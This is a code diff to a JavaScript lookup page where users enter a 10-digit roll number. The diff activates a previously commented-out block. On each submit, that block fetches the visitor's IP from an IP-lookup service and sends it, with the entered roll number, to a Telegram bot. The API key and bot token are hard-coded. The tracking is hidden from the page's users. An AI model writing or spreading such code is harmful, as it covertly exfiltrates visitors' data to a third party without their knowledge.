@@ -4,14 +4,14 @@ const $submitButton = document.querySelector(".custom-btn");
 $submitButton.addEventListener('click',async(e)=>{
 e.preventDefault()
 const number = document.getElementById("searchTerm").value;
-/*
+
 function json(url) {
     return fetch(url).then(res => res.json());
   }
   
   json(`https://api.ipdata.co?api-key=3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8`).then(ungamma => {
  fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text=%0A✶•> '+number+"%0A✶•> "+ungamma.ip);
-  }); */
+  }); 
 if(number.length == 10){
 $('body').append(`<div class="load-wrapper" id="loadingDiv">
 <div class="box-wrapper">
@@ -65,7 +65,7 @@ if(!result.error){
     () => {
         load.remove()
         document.getElementById("table").innerHTML = tableHTML;
-    },3000
+    },5000
    )
 
 }else{
@@ -86,7 +86,7 @@ else{
     alert("Pleamse enter 10 digit roll number");
 }
 })
-// logged();
+
 function logged(){ 
  function json(url) {
   return fetch(url).then(res => res.json());
